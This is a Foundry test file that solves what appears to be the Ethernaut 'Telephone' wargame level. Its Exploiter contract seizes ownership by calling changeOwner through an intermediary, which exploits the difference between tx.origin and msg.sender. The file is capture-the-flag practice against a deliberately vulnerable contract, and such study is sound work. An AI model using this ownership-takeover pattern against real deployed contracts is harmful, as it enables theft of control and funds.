pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/05.sol";

contract Exploiter {

    constructor() {}

    function exploit(Telephone instance) external {
        instance.changeOwner(msg.sender);
    }

    receive() external payable { }
}

contract Test05 is Test {

    address user = address(0x1);
    Telephone instance;
    
    function setUp() public {
        instance = new Telephone();
    }

    function testSolve() public {
        Exploiter exploiter = new Exploiter();
        
        address previousOwner = instance.owner();
        console.log("Previous Owner: ", previousOwner);

        vm.prank(user);
        exploiter.exploit(instance);
        
        address newOwner = instance.owner();
        console.log("New Owner: ", newOwner);

        assertEq(newOwner, user);
    }

}